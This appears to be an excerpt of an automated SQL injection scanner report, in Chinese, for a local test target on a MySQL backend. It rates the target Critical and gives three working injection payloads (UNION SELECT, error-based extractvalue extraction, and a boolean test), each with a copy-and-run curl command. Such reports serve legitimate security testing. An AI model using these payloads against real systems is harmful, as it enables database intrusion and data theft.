...
- 扫描ID：`Vwbm6PV1OqIR`
- 目标：`http://127.0.0.1:8178/num?id=1`
- 风险等级：**Critical**
- 数据库：MySQL
- 注入点：1 · 漏洞：3
...
- 请求：`GET http://127.0.0.1:8178/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-`
...
- 生成时间：2026-09-11T18:17:08.416Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8178/num?id=1+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27%2C%27SQLISCANNER4%27--+-'
```
...
- 请求：`GET http://127.0.0.1:8178/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-`
...
```bash
curl -i -s -k 'http://127.0.0.1:8178/num?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-'
```
...
- 请求：`GET http://127.0.0.1:8178/num?id=1+AND+1%3D1`
- Payload：`1 AND 1=1`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-11T18:17:08.416Z
...
```bash
curl -i -s -k 'http://127.0.0.1:8178/num?id=1+AND+1%3D1'
```
